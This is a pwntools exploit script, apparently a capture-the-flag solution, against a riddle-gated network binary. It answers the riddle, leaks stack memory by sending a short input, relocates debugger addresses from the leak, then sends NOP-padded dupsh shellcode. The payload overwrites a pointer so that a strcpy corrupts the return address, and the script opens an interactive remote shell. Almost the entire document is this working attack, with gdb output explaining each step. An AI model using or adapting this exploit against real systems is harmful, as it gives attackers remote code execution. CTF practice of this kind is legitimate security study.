#!/usr/bin/env python
from pwn import *
context(os='linux',arch='amd64')

# If a HOST is given on the cmdline, then assume that it is already running there
if 'HOST' in pwn.args:
    HOST = pwn.args['HOST']
    PORT = int(pwn.args.get('PORT', 6666))
else:
    # Otherwise start the binary locally
    HOST = 'localhost'
    PORT = 6666
    service = process('./94dd6790cbf7ebfc5b28cc289c480e5e')
    sleep(0.1)

#
# The first thing you must do is solve a riddle on the challenge
# Create a little helper to do this.
#
def solve_riddle(r):
    r.sendlineafter('\x00', 'arsenal')
    r.sendlineafter('\x00', 'gyeongbokgung')
    r.sendlineafter('\x00', 'psy')
    r.recvuntil('\x00')
    log.success("Solved riddle")

#
# By sending too little data, we can leak stack data
#
log.info("Dumping stack...")
with remote(HOST, PORT) as r:
    solve_riddle(r)
    r.send('A' + '\x00' * 7)
    stack_leak = r.recvall()

log.info("Stack leak:\n%s" % hexdump(stack_leak[:0x30], 8))


#
# The overall stack structure looks like below, when dumped at 400CD0.
#
# Note that rbp-8, -0, and +8 are displayed below.  These correspond to:
#
# - p_buffer
# - frame pointer
# - return address
#
#     gdb-peda$ telescope $rbp-8 3
#     0000| 0x7fffffffd1b8 --> 0x7fffffffd0b0 --> 0x7fffffffd168 --> 0x0
#     0008| 0x7fffffffd1c0 --> 0x7fffffffd600 --> 0x0
#     0016| 0x7fffffffd1c8 --> 0x40121e (mov    rax,QWORD PTR [rip+0x200eb3]        # 0x6020d8)
#
# Here we see the actual arguments passed in to the memcpy.
#
#     gdb-peda$ context code 2
#     -------------------------------------code-------------------------------------]
#     => 0x400cd0:    call   0x400a80 <memcpy@plt>
#     Guessed arguments:
#     arg[0]: 0x7fffffffd0b0 --> 0x7fffffffd168 --> 0x0
#     arg[1]: 0x7fffffffd6e8 --> 0x41 ('A')
#     arg[2]: 0x1
#
# And this is the data that ends up in 'stack_leak'.
# Note that it starts with 'A\x00', our supplied name.
#
#     00000000  41 00 ff ff   ff 7f 00 00  |A.......|
#     00000008  a0 68 64 f7   ff 7f 00 00  |.hd.....|
#     00000010  00 00 00 00   00 00 00 00  |........|
#     00000018  c0 d1 ff ff   ff 7f 00 00  |........|
#     00000020  90 0a 40 00   00 00 00 00  |..@.....|
#     00000028  40 77 9f f7   ff 7f 00 00  |@w......|
#
# At +0x18 is the first full stack address, 0x7fffffffd1c0,
# which we will use as a reference point to calculate all other
# addresses in the actual binary (vs. the addresses in the debugger),
#

addresses = {
    'memcpy_src':       0x7fffffffd6e8,
    'memcpy_dst':       0x7fffffffd0b0,
    'strcpy_dst_deref': 0x7fffffffd1b8,
    'frame':            0x7fffffffd1c0,
    'return':           0x7fffffffd1c8
}

debugger_stack = 0x7fffffffd1c0
actual_stack   = u64(stack_leak[0x18:][:8])

log.info("Remote addresses:")
for k in addresses.keys():
    addr = addresses[k]
    addr -= debugger_stack
    addr += actual_stack
    log.info("%x %s" % (addr, k))
    addresses[k] = addr

"""
In order to exploit, we have to survive the strcpy().

Since we know where everything on the stack is, this is almost straightfoward.

Instead of directly overwriting the return address, we will overwrite p_dest
such that the strcpy() will effectively shift our buffer up the stack to
overwrite some of the least significant bytes of the return address.

before             post-memcpy        post-strcpy
------             ------             ------
buffer <-.         buffer             buffer <-.
...      |         ...                ...      |
...      |         ...                ...      |
...      |         ...                ...      |
-----    |         -----              ...      |
pbuffer -`         XXuffer .          ...      |
-----              -----    |         -----    |
frame              frame    |         frame    |
-----              -----    |         -----    |
retaddr            retaddr <`         XXtaddr -`
-----              -----              -----
"""

sizeof_buffer = 0x108
nop   = asm(shellcraft.nop())
pad   = nop
delta = addresses['return'] - addresses['strcpy_dst_deref']

buf = asm(shellcraft.dupsh(4))
buf = buf.ljust(sizeof_buffer, pad)
buf += p64(addresses['memcpy_dst'] + delta)

log.info("Exploit buf:\n%s" % hexdump(buf, 8))

with remote(HOST, PORT, timeout=0.5) as r:
    solve_riddle(r)
    r.send(buf)
    r.interactive()

if service:
    service.close()
